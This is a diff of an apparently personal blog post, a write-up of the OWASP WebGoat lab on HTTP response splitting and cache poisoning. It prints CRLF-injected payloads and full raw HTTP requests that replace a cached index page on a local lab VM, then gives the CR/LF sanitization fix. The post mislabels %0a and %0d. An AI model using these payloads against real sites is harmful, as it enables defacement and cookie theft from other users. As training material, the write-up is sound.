@@ -4,8 +4,8 @@ title:  "OWASP BWA WebGoat Challenge Part 1"
 date:   2017-01-24 00:50:00 -0500
 categories: coding security owasp bwa
 ---
-# WebGoat Part 1: HTTP Response Splitting
-The first section of WebGoat is called "General", but the main topic covered is HTTP Response Splitting. HTTP Response splitting is an attack that can be performed on a webserver that does not properly implement sanitization of user input on webpage forms. The specific exploitation that can be performed involves the use of carriage returns (%0a in HTML) and linefeeds (%0d in HTML). 
+# HTTP Response Splitting
+HTTP Response splitting is an attack that can be performed on a webserver that does not properly implement sanitization of user input on webpage forms. The specific exploitation that can be performed involves the use of carriage returns (%0a in HTML) and linefeeds (%0d in HTML). 
 
 Normally, form entry is passed in a webpage's (client control) request to the webserver. The form fields are then appended onto the request header like so:
 
@@ -82,8 +82,77 @@ Content-Length: 17
 <html>pwnd</html>
 ```
 
-Now, the webcache only saw one request sent to the webserver by us (the attacker). Therefore our redirect is handled normally and we are served the cached response, which is the redirect to the location specified in the Location header. However, if we immediately ask for the resource again the webserver will match this new request with the second malicious response and cache the malicious response as the proper response for the requested resource. Now all subsequent requests for the resource will be served the malicious response that we crafted.
+Now, the webcache only saw one request sent to the webserver by us (the attacker). Therefore our redirect is handled normally and we are served the cached response, which is the redirect to the location specified in the Location header. However, there is another response that was created from our first request. Using this response combined with some knowledge of how the webcache and webserver interact, we can craft an attack that could affect any other users of the resource.
+
+# Cache Poisoning
+So we have previously shown that we can split a single request into two separate responses, the second of which is completely attacker controlled. Now we can manipulate a mechanism that the webserver and webcache use for serving content in order to expose our crafted response to the maximum number of target users of the website.
+
+Remember that in our first HTTP splitting example, the truncated response for the redirect resource was matched to our intial request. This left our payload response "on the wire" so to speak, as there was not a matching request for this resource. In a naive attack, the next request for a resource would be matched to our payload response and the payload would be served to whoever sent that request. However, we want to maximize the impact of our attack. Enter caching.
+
+Caching is a way that the webserver serves the most up-to-date version of a resource to users of the site. Any requests that are sent for a static resource are served the cached version of the resource. Using HTTP splitting, we can perform a "cache poisoning" attack, in which we replace the expected cache of a resource with our malicious version. This is done by adding a "Last-Modified" header to the forged request with a date in the future.
+
+So, now our attack looks like this:
+
+```
+test%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aLast-Modified:%20Fri,%2020%20Jan%202018%2013:35:00%20EST%0aContent-Type:%20text/html%0aContent-Length:%2017%0a<html>pwnd</html>
+```
+
+which translates to the following responses:
+
+```
+HTTP/1.1 302 Moved Temporarily
+Date: Tue, 24 Jan 2017 02:35:59 GMT
+Server: Apache-Coyote/1.1
+Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Last-Modified: Fri, 20 Jan 2018 13:35:00 EST
+Content-Type:text/html
+Content-Length: 17
+<html>pwnd</html>
+```
+
+Now during this attack we send two requests. The first request is our malicious form, and the second request is for the webserver resource that we would like to replace with our malicious response, like so:
+
+Request 1:
+
+```
+POST /WebGoat/lessons/General/redirect.jsp?Screen=3&menu=100 HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=foobar%0aContent-Length:%2043%0a%3Chtml%3E123456789012345678901234567890%3C/html%3E
+Cookie: JSESSIONID=30084DBD49F5F0CA28D74331EC271DB8; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic dXNlcjp1c2Vy
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 271
+
+language=test%250aContent-Length%3A%25200%250a%250aHTTP%2F1.1%2520200%2520OK%250aLast-Modified%3A%2520Fri%2C%252020%2520Jan%25202018%252013%3A35%3A00%2520EST%250aContent-Type%3A%2520text%2Fhtml%250aContent-Length%3A%252017%250a%3Chtml%3Epwnd%3C%2Fhtml%3E&SUBMIT=Search%21
+```
+
+Request 2:
+
+```
+GET /WebGoat/index.html HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+```
+
+When we send the malicious request, it is matched to the original redirect response. Now we have another response waiting to match with a request. Now our second request is received and matched with our malicious response. The webcache sees that the "Last-Modified" header is present in the response, and the date is more recent than the existing cached version, so it replaces the cache for the requested resource ("index.hmtl") with the malicious response ("<html>pwnd</html>").
 
 <img src="{{ site.baseurl }}/images/part1pwnd.jpg">
 
 This can be much more serious than a simple defacement like we performed here. Alternatively, an attacker could append JavaScript to perform cross-site scripting attacks to steal cookies or other sensitive user data. In order to prevent this attack, any user-controlled data that can end up in a request header needs to be sanitized to prevent insertion of carriage-return and linefeed characters.
+
+### Resources
+1 [HTTP Response Splitting Whitepaper][http-splitting-whitepaper]
+2 [OWASP HTTP Response Splitting][owasp-splitting]
+
+[http-splitting-whitepaper]:https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf
+[owasp-splitting]:https://www.owasp.org/index.php/HTTP_Response_Splitting
